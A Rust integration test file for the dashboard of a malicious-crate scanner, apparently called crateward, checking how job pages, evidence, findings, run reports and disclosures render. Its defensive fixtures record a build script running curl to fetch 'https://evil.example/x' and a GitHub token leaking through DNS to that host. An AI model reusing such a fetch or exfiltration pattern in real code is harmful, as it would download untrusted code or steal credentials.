//! The job page, as a browser gets it: the real router on a loopback port,
//! in front of a private schema that holds a seeded job.
//!
//! The database setup is `crateward_core::testing`.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::indexing_slicing)]

use std::future::IntoFuture;
use std::sync::Arc;
use std::time::Duration;

use crateward_api::{AppState, router};
use crateward_core::app::Stop;
use crateward_core::job::{JobEvent, JobId, Stage, Triage};
use crateward_core::store::{CrateFile, DisclosureKind, NewJob, Review, Store};
use crateward_core::testing::{TestDb, policies};
use crateward_core::verdict::{
    Coverage, Evidence, EvidenceSource, RiskLevel, StaticOnlyReason, Verdict,
};
use serde_json::{Value, json};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

const CKSUM: &str = "abababababababababababababababababababababababababababababababab";

/// A migrated private schema with the dashboard in front of it.
struct Dashboard {
    db: TestDb,
    store: Store,
    port: u16,
}

impl Dashboard {
    async fn start() -> Option<Self> {
        let db = TestDb::new("api").await?;
        let store = db.migrated().await;
        let state = AppState {
            reader: db.store().await,
            writer: db.store().await,
            stop: Stop::install().unwrap(),
        };

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        tokio::spawn(axum::serve(listener, router(Arc::new(state), port)).into_future());

        Some(Self { db, store, port })
    }

    /// The status and body of a `GET`.
    async fn get(&self, path: &str) -> (u16, String) {
        let (status, _, body) = self.fetch(path).await;

        (status, body)
    }

    /// The status, lowercased head and body of a `GET`.
    async fn fetch(&self, path: &str) -> (u16, String, String) {
        self.request("GET", path, "").await
    }

    /// The status of a form `POST` from the dashboard itself.
    async fn post(&self, path: &str, form: &str) -> u16 {
        self.request("POST", path, form).await.0
    }

    async fn request(&self, method: &str, path: &str, form: &str) -> (u16, String, String) {
        let mut stream = TcpStream::connect(("127.0.0.1", self.port)).await.unwrap();
        let host = format!("127.0.0.1:{}", self.port);
        let request = format!(
            "{method} {path} HTTP/1.1\r\nHost: {host}\r\nOrigin: http://{host}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\
             Connection: close\r\n\r\n{form}",
            form.len()
        );

        stream.write_all(request.as_bytes()).await.unwrap();
        let mut raw = Vec::new();
        stream.read_to_end(&mut raw).await.unwrap();
        let text = String::from_utf8(raw).unwrap();
        let (head, body) = text.split_once("\r\n\r\n").unwrap();
        let status = head.split(' ').nth(1).unwrap().parse().unwrap();

        (status, head.to_ascii_lowercase(), body.to_owned())
    }

    /// The page of a job.
    async fn page(&self, job: JobId) -> String {
        let (status, html) = self.get(&format!("/jobs/{}", job.0)).await;

        assert_eq!(status, 200);

        html
    }

    async fn job(&self) -> JobId {
        let new = NewJob {
            name: "evil".parse().unwrap(),
            version: "0.1.0".parse().unwrap(),
            cksum: CKSUM.parse().unwrap(),
            published_at: None,
            priority: 0,
            index_entry: json!({}),
        };

        self.store.enqueue(&new).await.unwrap().unwrap()
    }

    /// One worker takes the job and reports an event.
    async fn step(&mut self, job: JobId, stage: Stage, worker: &str, event: JobEvent) {
        let lease = Duration::from_secs(30);
        let claimed = self.store.claim(stage, worker, lease).await.unwrap();

        assert_eq!(claimed.unwrap().id, job);

        let policies = policies();
        let done = self.store.complete(job, worker, event, &policies, false);
        done.await.unwrap();
    }

    /// An event row as an older or damaged database could hold it.
    async fn raw_event(&self, job: JobId, at: &str, event: &str) {
        let insert = format!(
            "INSERT INTO {}.job_events (job_id, at, from_state, to_state, event, effect, worker)
             VALUES ($1, {at}, 'Scored', 'Finalized', $2::text::jsonb, '{{}}'::jsonb, 'w-raw')",
            self.db.schema()
        );

        self.db
            .admin()
            .execute(&insert, &[&job.0, &event])
            .await
            .unwrap();
    }

    async fn drop(self) {
        self.db.drop().await;
    }
}

fn evidence(
    signal: &str,
    points: u32,
    source: EvidenceSource,
    summary: &str,
    package: Option<&str>,
    location: Option<&str>,
) -> Evidence {
    Evidence {
        signal: signal.to_owned(),
        points,
        source,
        summary: summary.to_owned(),
        package: package.map(str::to_owned),
        location: location.map(str::to_owned),
    }
}

/// One piece of evidence from each source, with guest text that needs
/// escaping.
fn verdict() -> Verdict {
    use EvidenceSource::{Diff, Disk, Network, Run, Static, Trace};

    Verdict {
        score: 85,
        level: RiskLevel::from_score(85),
        coverage: Coverage::DynamicLinux,
        evidence: vec![
            evidence(
                "honeytoken_left_vm",
                60,
                Network,
                "a token went out",
                Some("evil"),
                Some("203.0.113.9:443"),
            ),
            evidence(
                "exec_curl",
                10,
                Trace,
                "ran <curl> & \"more\"",
                None,
                Some("build.rs:12"),
            ),
            evidence("obfuscation", 5, Static, "packed string", Some("dep"), None),
            evidence("new_network", 4, Diff, "new since 0.0.9", None, None),
            evidence("disk_write", 3, Disk, "wrote outside target", None, None),
            evidence("timeout", 3, Run, "the run ended late", None, None),
        ],
        profile: vec!["exec:curl".to_owned(), "net:203.0.113.9:443".to_owned()],
        new_behavior: vec!["exec:curl".to_owned()],
        analyzer_version: 1,
    }
}

/// Findings of every shape the page has to show, then filler up to a number
/// above the page's limit of 300.
fn static_report() -> Value {
    let mut findings = vec![
        json!({"severity": "high", "kind": "build_script", "rule": "net_call", "context": "fn main", "file": "build.rs", "line": 12, "evidence": "Command::new(\"curl\")"}),
        json!({"severity": "low", "kind": "unsafe_block", "context": "lib", "file": "src/lib.rs", "evidence": "unsafe { <x> }"}),
        json!({"severity": 3, "kind": "odd", "rule": 7, "context": null, "file": "src/odd.rs", "line": "9", "evidence": true}),
        json!({"kind": "sparse"}),
    ];

    for i in 4..305 {
        findings.push(json!({"severity": "info", "kind": "filler", "file": "src/f.rs", "evidence": format!("e{i}")}));
    }

    for line in 1..=60 {
        findings.push(json!({"severity": "medium", "kind": "process_spawn", "context": "build_script", "file": "build.rs", "line": line, "evidence": "Command::new"}));
    }

    json!({"findings": findings})
}

fn crate_file() -> CrateFile {
    CrateFile {
        sha256: CKSUM.parse().unwrap(),
        name: "evil".to_owned(),
        version: "0.1.0".to_owned(),
        blake3: None,
        compressed_bytes: 5,
        unpacked_bytes: 9,
        stored_bytes: None,
        report: json!({}),
    }
}

/// A check run whose build script downloaded something, with guest text
/// that needs escaping.
fn run_report() -> Value {
    json!({
        "outcome": "succeeded", "end": "finished", "exit": {"Code": 0},
        "run_ms": 4250, "restore_ms": 90, "payload_files": 3, "payload_bytes": 4096,
        "stdout_tail": "", "stderr_tail": "warning: <unused>", "truncated": false,
        "missing_packages": [],
        "network": {"dns": ["evil.example"], "connections": [], "udp_datagrams": 0, "refused": 0, "truncated": false},
        "leaked": [{"kind": "github_token", "via": "dns:evil.example"}],
        "trace": {"complete": true, "opens": 12, "processes_omitted": 0, "omitted": 0,
                  "processes": [
                      {"pid": 1, "exe": "/usr/bin/cargo", "argv": ["cargo", "check"], "role": "cargo", "started_ms": 0},
                      {"pid": 2, "ppid": 1, "exe": "/usr/bin/rustc", "argv": ["rustc"], "role": "rustc", "started_ms": 5},
                      {"pid": 3, "ppid": 1, "exe": "/w/build-script-build", "argv": ["b"], "role": "build_script", "started_ms": 9},
                      {"pid": 4, "ppid": 3, "exe": "/usr/bin/<curl>", "argv": ["curl", "https://evil.example/x"], "role": "other", "started_ms": 12, "exit": 0}
                  ],
                  "sensitive_opens": [], "writes_outside_work": [], "sockets": [], "tamper": []}
    })
}

type Row = Vec<String>;

fn row(cells: &[&str]) -> Row {
    cells.iter().map(|c| (*c).to_owned()).collect()
}

/// The five characters askama escapes, back to text.
fn unescape(text: &str) -> String {
    text.replace("&#60;", "<")
        .replace("&#62;", ">")
        .replace("&#34;", "\"")
        .replace("&#39;", "'")
        .replace("&#38;", "&")
}

/// The text of a cell, with the tags inside it (links) removed.
fn cells(row: &str) -> Row {
    let cell = |piece: &str| {
        let start = piece.find("<t")?;
        let inner = &piece[start + piece[start..].find('>')? + 1..];
        let mut plain = String::new();
        let mut in_tag = false;
        for c in inner.chars() {
            match c {
                '<' => in_tag = true,
                '>' => in_tag = false,
                _ if !in_tag => plain.push(c),
                _ => {}
            }
        }

        Some(unescape(&plain))
    };

    row.split("</t").filter_map(cell).collect()
}

/// The cells of the table after `heading`, one list per row.
fn table(html: &str, heading: &str) -> Vec<Row> {
    let after = &html[html.find(heading).unwrap()..];
    let start = after.find("<table").unwrap();
    let end = after.find("</table>").unwrap();

    let rows = after[start..end]
        .replace("<thead>", "")
        .replace("</thead>", "")
        .replace("<tbody>", "")
        .replace("</tbody>", "");

    rows.split("<tr").skip(1).map(cells).collect()
}

/// The label and value pairs of the facts after `heading`.
fn facts(html: &str, heading: &str) -> Vec<Row> {
    let after = &html[html.find(heading).unwrap()..];
    let end = after.find("</dl>").unwrap();
    let pair = |piece: &str| {
        let (label, rest) = piece.split_once("</dt><dd>")?;
        Some(row(&[label, &unescape(rest.split_once("</dd>")?.0)]))
    };

    after[..end]
        .split("<dt>")
        .skip(1)
        .filter_map(pair)
        .collect()
}

/// Each static finding group as its summary's text, then the text of each
/// evidence with its places.
fn groups(html: &str) -> Vec<Row> {
    let start = html.find("<div class=\"findings\">").unwrap();
    let rest = &html[start..];
    let end = ["<section class=\"run\"", "<details class=\"section\""]
        .iter()
        .filter_map(|marker| rest.find(marker))
        .min()
        .unwrap();

    let section = &rest[..end];

    section
        .split("<details class=\"group")
        .skip(1)
        .map(|group| {
            let mut texts = vec![text(group, "<summary>", "</summary>")];
            texts.extend(
                group
                    .split("<li>")
                    .skip(1)
                    .map(|item| text(item, "<code", "</li>")),
            );
            texts
        })
        .collect()
}

/// The text between `open` and `close`, tags removed, white space collapsed.
fn text(html: &str, open: &str, close: &str) -> String {
    let start = html.find(open).unwrap();
    let end = start + html[start..].find(close).unwrap();
    let mut plain = String::new();
    let mut in_tag = false;
    for c in html[start..end].chars() {
        match c {
            '<' => in_tag = true,
            '>' => in_tag = false,
            _ if !in_tag => plain.push(c),
            _ => {}
        }
    }

    unescape(&plain.split_whitespace().collect::<Vec<_>>().join(" "))
}

/// The section of a run.
fn run_section<'a>(html: &'a str, kind: &str) -> &'a str {
    let after = &html[html.find(&format!("<h2>Run: {kind}</h2>")).unwrap()..];

    &after[..after.find("</section>").unwrap()]
}

/// A job that went through three stages and has everything recorded that
/// the page can show.
async fn seed_full_job(db: &mut Dashboard) -> JobId {
    let job = db.job().await;
    let fetched = JobEvent::Fetched;
    db.step(job, Stage::Fetch, "w-fetch", fetched).await;
    let triage = Triage::StaticOnly(StaticOnlyReason::NoBuildTimeCode);
    let analyzed = JobEvent::StaticAnalysisCompleted { triage };
    db.step(job, Stage::StaticAnalysis, "w-static", analyzed)
        .await;
    let scored = JobEvent::Scored { escalate: false };
    db.step(job, Stage::Analysis, "w-analysis", scored).await;
    let store = &db.store;
    store.record_verdict(job, &verdict()).await.unwrap();

    assert!(
        store
            .set_review(job, Review::Confirmed, None)
            .await
            .unwrap()
    );

    store.record_crate_file(&crate_file()).await.unwrap();
    let cksum = CKSUM.parse().unwrap();
    let report = static_report();
    store
        .record_static_report(&cksum, 7, true, Some("high"), &report)
        .await
        .unwrap();
    store
        .record_run(job, "full", "completed", &run_report())
        .await
        .unwrap();
    store
        .record_run(job, "check", "completed", &json!({"network": "x"}))
        .await
        .unwrap();
    let kind = DisclosureKind::Malicious;
    let note = Some("n<1>");
    let reported = store.record_report(job, kind, "crates.io", Some("RUSTSEC-1"), note);
    reported.await.unwrap().unwrap();
    store.mark_resolved(job, None).await.unwrap().unwrap();
    store
        .publish_finding(job, "evil-0-1-0")
        .await
        .unwrap()
        .unwrap();

    job
}

#[tokio::test]
async fn a_scored_and_confirmed_job_shows_everything_the_store_knows() {
    let Some(mut db) = Dashboard::start().await else {
        return;
    };

    let job = seed_full_job(&mut db).await;
    let day = db.store.disclosure(job).await.unwrap().unwrap();

    let html = db.page(job).await;
    assert_eq!(text(&html, "<h1>", "</h1>"), "evil 0.1.0");
    assert_eq!(
        text(&html, "<p class=\"meta\">", "</p>"),
        format!("Scored static only job {} crates.io", job.0)
    );
    assert!(html.contains("href=\"https://crates.io/crates/evil/0.1.0\""));
    assert_eq!(
        text(&html, "<p class=\"headline\">", "</p>"),
        "a token went out"
    );
    assert_eq!(
        text(
            &html,
            "<div class=\"verdict tone-critical\">",
            "<div class=\"decision\">"
        ),
        "85 critical"
    );
    assert_eq!(
        text(&html, "<div class=\"decision\">", "<form"),
        "Review confirmed"
    );
    assert_eq!(
        text(&html, "<nav class=\"toc\"", "</nav>"),
        "Disclosure Evidence 6 Behavior 2 Static findings 365 Run: full 1 Timeline 3"
    );

    let form = format!("action=\"/jobs/{}/review\"", job.0);
    assert_eq!(html.matches(&form).count(), 2);

    let reported_on = format!("{} to crates.io", day.reported_on.as_deref().unwrap());
    let disclosure = facts(&html, "<h2 id=\"disclosure\">");

    assert_eq!(
        disclosure,
        [
            row(&["Kind", "malicious"]),
            row(&["Reported", &reported_on]),
            row(&["Reference", "RUSTSEC-1"]),
            row(&["Resolved", day.resolved_on.as_deref().unwrap()]),
            row(&["Published", day.published_on.as_deref().unwrap()]),
            row(&["Page", "evil-0-1-0"]),
            row(&["Note", "n<1>"]),
        ]
    );

    // Points, the signal with its source and package, where, what.
    assert_eq!(
        table(&html, "<h2 id=\"evidence\">"),
        [
            row(&["Points", "Signal", "Where", "What"]),
            row(&[
                "60",
                "honeytoken_left_vmnetwork · evil",
                "203.0.113.9:443",
                "a token went out"
            ]),
            row(&[
                "10",
                "exec_curltrace",
                "build.rs:12",
                "ran <curl> & \"more\""
            ]),
            row(&["5", "obfuscationstatic · dep", "", "packed string"]),
            row(&["4", "new_networkdiff", "", "new since 0.0.9"]),
            row(&["3", "disk_writedisk", "", "wrote outside target"]),
            row(&["3", "timeoutrun", "", "the run ended late"]),
        ]
    );
    assert!(html.contains("<span class=\"points bad\">60</span>"));
    assert!(html.contains("<span class=\"points warn\">10</span>"));
    assert!(html.contains("<span class=\"points low\">5</span>"));
    assert!(!html.contains("without points"));
    assert!(html.contains("<code class=\"chip new\">exec:curl</code>"));
    assert!(html.contains("<code class=\"chip\">net:203.0.113.9:443</code>"));

    // Grouped by severity, kind and context, severe and large groups
    // first, with one filter button per severity.
    assert_eq!(
        text(&html, "<div class=\"filter\"", "</div>"),
        "All 365 high 1 medium 60 low 1 info 301 other 2 6 groups"
    );

    let groups = groups(&html);
    assert_eq!(groups.len(), 6);
    assert_eq!(
        groups[0],
        row(&[
            "high build_script net_call fn main 1",
            "Command::new(\"curl\") build.rs:12"
        ])
    );
    assert!(html.contains("<details class=\"group sev-high\" open>"));
    assert!(html.contains("<details class=\"group sev-medium\">"));

    let spawn = &groups[1];
    assert_eq!(spawn.len(), 2);
    assert_eq!(spawn[0], "medium process_spawn build_script 60");
    assert!(spawn[1].starts_with("Command::new build.rs:1 build.rs:2 "));
    assert!(spawn[1].ends_with(" build.rs:50 and 10 more"));

    assert_eq!(
        groups[2],
        row(&["low unsafe_block lib 1", "unsafe { <x> } src/lib.rs"])
    );
    assert_eq!(groups[3].len(), 302);
    assert_eq!(groups[3][0], "info filler 301");
    assert_eq!(groups[3][301], "e304 src/f.rs");
    assert_eq!(groups[4], row(&["3 odd null 1", "true src/odd.rs"]));
    assert_eq!(groups[5], row(&["sparse 1", ""]));

    let timeline = table(&html, "<h2>Timeline</h2>");
    assert_eq!(timeline[0], row(&["When", "From", "To", "Event", "Worker"]));
    assert!(timeline[1..].iter().all(|r| r[0].ends_with(" ago")));

    let steps: Vec<&[String]> = timeline[1..].iter().map(|r| &r[1..]).collect();
    assert_eq!(
        steps,
        [
            row(&["Discovered", "Fetched", "fetched", "w-fetch"]),
            row(&[
                "Fetched",
                "StaticallyAnalyzed",
                "static_analysis_completed",
                "w-static"
            ]),
            row(&["StaticallyAnalyzed", "Scored", "scored", "w-analysis"]),
        ]
    );

    assert!(
        !html.contains("<h2>Run: check</h2>"),
        "the full run replaces it"
    );

    let full = run_section(&html, "full");
    assert_eq!(
        text(full, "<ul class=\"alerts\">", "</ul>"),
        "Honeytoken github_token left the VM through dns:evil.example"
    );
    assert!(full.contains("<span class=\"badge ok\">succeeded</span>"));

    for (label, value) in [
        ("Ended", "agent reported the end"),
        ("Guest", "exit code 0"),
        ("Run time", "4.2 s"),
        ("Payload", "3 files, 4.0 KiB"),
        ("Files opened", "12"),
    ] {
        assert!(
            full.contains(&format!("<dt>{label}</dt><dd>{value}</dd>")),
            "{label}"
        );
    }

    let tree = table(full, "<h3>Processes");
    assert_eq!(tree.len(), 5);
    assert_eq!(tree[3][0], "└build_script /w/build-script-build");
    assert_eq!(
        tree[4],
        row(&[
            "└other /usr/bin/<curl>",
            "https://evil.example/x",
            "12 ms",
            "",
            "0"
        ])
    );
    assert!(full.contains("<tr class=\"role-rustc compiler\">"));
    assert!(
        !full.contains("<curl>") && !full.contains("<unused>"),
        "guest text is escaped"
    );
    assert!(full.contains("<code class=\"chip\">evil.example</code>"));
    assert!(full.contains("href=\"/jobs/1/runs/full.json\""));
    assert!(full.contains("<a href=\"/jobs/1/runs/check.json\" download>"));

    let (status, head, body) = db.fetch("/jobs/1/runs/full.json").await;
    assert_eq!(status, 200);

    let file = "filename=\"crateward-job-1-full.json\"";
    assert!(head.contains(&format!("content-disposition: attachment; {file}")));
    assert_eq!(serde_json::from_str::<Value>(&body).unwrap(), run_report());

    let (_, _, body) = db.fetch("/jobs/1/runs/check.json").await;
    assert_eq!(
        serde_json::from_str::<Value>(&body).unwrap(),
        json!({"network": "x"})
    );
    assert_eq!(db.fetch("/jobs/1/runs/other.json").await.0, 404);
    assert_eq!(db.fetch("/jobs/1/runs/check").await.0, 404);

    db.drop().await;
}

#[tokio::test]
async fn a_new_job_shows_empty_sections() {
    let Some(db) = Dashboard::start().await else {
        return;
    };

    let job = db.job().await;

    let html = db.page(job).await;
    assert_eq!(text(&html, "<h1>", "</h1>"), "evil 0.1.0");
    assert_eq!(
        text(&html, "<p class=\"meta\">", "</p>"),
        format!("Discovered job {} crates.io", job.0)
    );
    assert!(!html.contains("/review"));
    assert!(!html.contains("class=\"verdict"));
    assert!(!html.contains("class=\"headline\""));
    assert!(!html.contains("id=\"disclosure\""));
    assert!(!html.contains("New since the previous version"));
    assert!(!html.contains("<h2>Run:"));
    assert!(
        html.contains("<h2 id=\"evidence\">Evidence</h2>\n<p class=\"muted\">No evidence.</p>")
    );
    assert!(html.contains("<h4>Profile</h4>\n<p class=\"muted\">Empty.</p>"));
    assert!(
        html.contains("<h2 id=\"findings\">Static findings</h2>\n<p class=\"muted\">None.</p>")
    );

    let timeline = table(&html, "<h2>Timeline</h2>");
    assert_eq!(timeline, [row(&["When", "From", "To", "Event", "Worker"])]);

    db.drop().await;
}

#[tokio::test]
async fn a_scored_job_offers_a_review_and_a_confirmed_one_its_disclosure() {
    let Some(db) = Dashboard::start().await else {
        return;
    };

    let job = db.job().await;
    db.store.record_verdict(job, &verdict()).await.unwrap();

    let html = db.page(job).await;

    assert_eq!(
        text(
            &html,
            "<div class=\"verdict tone-critical\">",
            "<div class=\"decision\">"
        ),
        "85 critical"
    );
    assert_eq!(
        text(&html, "<div class=\"decision\">", "<form"),
        "Review none"
    );

    let form = format!("action=\"/jobs/{}/review\"", job.0);
    assert_eq!(html.matches(&form).count(), 2);
    assert!(!html.contains("id=\"disclosure\""));

    assert!(
        db.store
            .set_review(job, Review::Confirmed, None)
            .await
            .unwrap()
    );

    let html = db.page(job).await;
    assert!(
        html.contains(
            "<h2 id=\"disclosure\">Disclosure</h2>\n\n<p class=\"muted\">Not reported yet."
        )
    );

    // Until the report is recorded, the inbox and a filter find it.
    let link = format!("<a href=\"/jobs/{}\">", job.0);
    let (_, inbox) = db.get("/inbox").await;
    let (waiting, unreported) = inbox.split_once("<h2>Confirmed, not reported").unwrap();

    assert!(!waiting.contains(&link) && unreported.contains(&link));
    assert!(unreported.contains("<span class=\"badge warn\">not reported</span>"));

    let (_, found) = db.get("/jobs?review=unreported").await;
    assert!(found.contains(&link));
    assert!(found.contains("<option value=\"unreported\" selected>"));
    assert!(!db.get("/jobs?review=pending").await.1.contains(&link));
    assert!(html.contains(&format!(
        "<code>crateward evidence {} --out &lt;dir&gt;</code>",
        job.0
    )));

    let kind = DisclosureKind::Vulnerability;
    let reported = db
        .store
        .record_report(job, kind, "the maintainer", None, None);

    reported.await.unwrap().unwrap();
    let day = db
        .store
        .disclosure(job)
        .await
        .unwrap()
        .unwrap()
        .reported_on
        .unwrap();

    assert!(!db.get("/jobs?review=unreported").await.1.contains(&link));
    assert!(db.get("/jobs?review=confirmed").await.1.contains(&link));

    let (_, inbox) = db.get("/inbox").await;
    assert!(inbox.contains("Every confirmed verdict was reported."));

    let html = db.page(job).await;
    assert_eq!(
        facts(&html, "<h2 id=\"disclosure\">"),
        [
            row(&["Kind", "vulnerability"]),
            row(&["Reported", &format!("{day} to the maintainer")]),
            row(&["Reference", "-"]),
            row(&["Resolved", "-"]),
            row(&["Published", "-"]),
            row(&["Page", "-"]),
            row(&["Note", "-"]),
        ]
    );

    db.drop().await;
}

#[tokio::test]
async fn events_without_a_kind_or_from_the_future_still_render() {
    let Some(db) = Dashboard::start().await else {
        return;
    };

    let job = db.job().await;
    db.raw_event(job, "now() + interval '1 hour'", "{}").await;
    db.raw_event(job, "now() - interval '3 days'", "{\"kind\": \"old\"}")
        .await;

    let html = db.page(job).await;

    let timeline = table(&html, "<h2>Timeline</h2>");
    assert_eq!(
        timeline[1..],
        [
            row(&["0 s ago", "Scored", "Finalized", "?", "w-raw"]),
            row(&["3 d ago", "Scored", "Finalized", "old", "w-raw"]),
        ]
    );

    db.drop().await;
}

#[tokio::test]
async fn an_unknown_job_is_not_found() {
    let Some(db) = Dashboard::start().await else {
        return;
    };

    assert_eq!(db.get("/jobs/999").await, (404, "no such job".to_owned()));

    db.drop().await;
}

#[tokio::test]
async fn the_job_list_counts_states_and_pages() {
    let Some(db) = Dashboard::start().await else {
        return;
    };

    for i in 0..101 {
        let new = NewJob {
            name: format!("many-{i}").parse().unwrap(),
            version: "0.1.0".parse().unwrap(),
            cksum: CKSUM.parse().unwrap(),
            published_at: None,
            priority: 0,
            index_entry: json!({}),
        };

        db.store.enqueue(&new).await.unwrap().unwrap();
    }

    let fail = format!(
        "UPDATE {}.jobs SET state = 'Failed' WHERE id = 7",
        db.db.schema()
    );

    db.db.admin().execute(&fail, &[]).await.unwrap();

    let link = |id: i64| format!("<a href=\"/jobs/{id}\">");
    let (status, first) = db.get("/jobs").await;

    assert_eq!(status, 200);
    assert!(first.contains("101 matching. Showing 1 to 10."));
    assert!(first.contains("<h1>Jobs <span class=\"count\">101</span></h1>"));
    assert!(first.contains("Discovered <span class=\"count\">100</span>"));
    assert!(first.contains("<a href=\"/jobs?state=Failed\">Failed <span class=\"count\">1</span>"));
    assert!(first.contains("Running <span class=\"count\">0</span>"));
    assert!(first.contains("<a href=\"/jobs\" aria-current=\"page\">Jobs</a>"));
    assert!(first.contains(&link(92)) && !first.contains(&link(91)));
    assert!(first.contains("<span class=\"disabled\" title=\"first page\">«</span>"));
    assert!(first.contains(
        "<span class=\"current\" title=\"page 1, shown\" aria-current=\"page\">1</span>"
    ));
    assert!(first.contains("<a href=\"/jobs?page=2\" title=\"next page\">›</a>"));
    assert!(first.contains("<a href=\"/jobs?page=11\" title=\"last page\">»</a>"));

    let (_, second) = db.get("/jobs?page=2").await;

    assert!(second.contains("<a href=\"/jobs\" title=\"previous page\">‹</a>"));

    let (_, last) = db.get("/jobs?page=11").await;

    assert!(last.contains("Showing 101 to 101."));
    assert!(last.contains(&link(1)) && !last.contains(&link(2)));
    assert!(last.contains("<a href=\"/jobs?page=10\" title=\"previous page\">‹</a>"));
    assert!(last.contains("<span class=\"disabled\" title=\"last page\">»</span>"));

    // Another page size, and links that keep the first job in view.
    let (_, third) = db.get("/jobs?per=25&page=3").await;

    assert!(third.contains("Showing 51 to 75."));
    assert!(third.contains(&link(51)) && third.contains(&link(27)));
    assert!(!third.contains(&link(52)) && !third.contains(&link(26)));
    assert!(third.contains("<span class=\"current\" aria-current=\"true\">25</span>"));
    assert!(
        third.contains("<a href=\"/jobs?per=50&#38;page=2\" title=\"50 jobs per page\">50</a>")
    );
    assert!(third.contains("<a href=\"/jobs?page=6\" title=\"10 jobs per page\">10</a>"));
    assert!(third.contains("<a href=\"/jobs?state=Failed&#38;per=25\">Failed"));

    // Out of range pages and sizes fall back.
    assert!(
        db.get("/jobs?page=99")
            .await
            .1
            .contains("Showing 101 to 101.")
    );
    assert!(db.get("/jobs?per=500").await.1.contains("Showing 1 to 10."));

    // The counts keep the other filters, the list takes the state.
    let (_, failed) = db.get("/jobs?name=many&state=Failed").await;

    assert!(failed.contains("1 matching"));
    assert!(failed.contains(&link(7)) && !failed.contains(&link(8)));
    assert!(
        failed.contains("<a href=\"/jobs?name=many&#38;state=Failed\" class=\"selected\" aria-current=\"page\">Failed")
    );
    assert!(failed.contains("<a href=\"/jobs?name=many\">all</a>"));
    assert!(failed.contains("<option value=\"Failed\" selected>"));

    // An unknown state is no filter.
    assert!(db.get("/jobs?state=Bogus").await.1.contains("101 matching"));
    assert!(db.get("/jobs?name=zzz").await.1.contains(
        "<p class=\"empty\">No job matches these filters. <a href=\"/jobs\">Clear them</a>.</p>"
    ));

    // The overview draws the states as bars on the same scale.
    let (status, overview) = db.get("/").await;
    assert_eq!(status, 200);
    assert!(overview.contains("<a href=\"/\" aria-current=\"page\">Overview</a>"));
    assert!(overview.contains(
        "<a class=\"bar\" href=\"/jobs?state=Discovered\"><span class=\"name\">Discovered</span>\n<meter min=\"0\" max=\"101\" value=\"100\">100</meter>"
    ));

    db.drop().await;
}

#[tokio::test]
async fn static_evidence_links_to_its_line_on_crates_io() {
    let Some(db) = Dashboard::start().await else {
        return;
    };

    let job = db.job().await;
    let spawn = evidence(
        "static:process_spawn",
        30,
        EvidenceSource::Static,
        "high severity process_spawn in build_script code",
        Some("evil"),
        Some("build.rs:3"),
    );

    // A verdict from before YARA matches had a line names only the file.
    let yara = evidence(
        "static:yara:reverse_shell",
        10,
        EvidenceSource::Static,
        "reverse shell",
        Some("evil"),
        Some("build.rs"),
    );

    let mut v = verdict();
    v.evidence = vec![spawn, yara];
    db.store.record_verdict(job, &v).await.unwrap();
    db.store.record_crate_file(&crate_file()).await.unwrap();
    let report = json!({"findings": [
        {"severity": "high", "kind": "process_spawn", "file": "build.rs", "line": 3,
         "evidence": "Command::new"},
        {"severity": "high", "kind": "yara_match", "rule": "reverse_shell", "file": "build.rs",
         "line": 9, "evidence": "reverse shell"},
        {"severity": "low", "kind": "process_spawn", "file": "src/lib.rs", "line": 3, "evidence": "other"}
    ]});

    let cksum = CKSUM.parse().unwrap();
    let recorded = db
        .store
        .record_static_report(&cksum, 4, true, None, &report);

    recorded.await.unwrap();

    let html = db.page(job).await;
    let evidence = &html
        [html.find("<h2 id=\"evidence\">").unwrap()..html.find("<h2 id=\"findings\">").unwrap()];

    let viewer = "https://crates.io/crates/evil/0.1.0/code/build.rs";

    assert!(evidence.contains(&format!("<a href=\"{viewer}#L3\"")));

    // The old verdict names only the file. The finding knows the line.
    assert!(evidence.contains(&format!("<a href=\"{viewer}#L9\"")));

    let findings = &html[html.find("<h2 id=\"findings\">").unwrap()..];
    assert!(findings.contains("href=\"https://crates.io/crates/evil/0.1.0/code/src/lib.rs#L3\""));

    db.drop().await;
}

#[tokio::test]
async fn burst_mode_is_switched_on_the_jobs_page() {
    let Some(db) = Dashboard::start().await else {
        return;
    };

    assert!(!db.get("/jobs").await.1.contains("Stop burst mode"));
    assert_eq!(db.post("/burst", "action=start").await, 303);
    assert!(db.store.bursting().await.unwrap());
    assert!(db.get("/jobs").await.1.contains("Stop burst mode"));

    assert_eq!(db.post("/burst", "action=stop").await, 303);
    assert!(!db.store.bursting().await.unwrap());
    assert_eq!(db.post("/burst", "action=later").await, 400);

    db.drop().await;
}
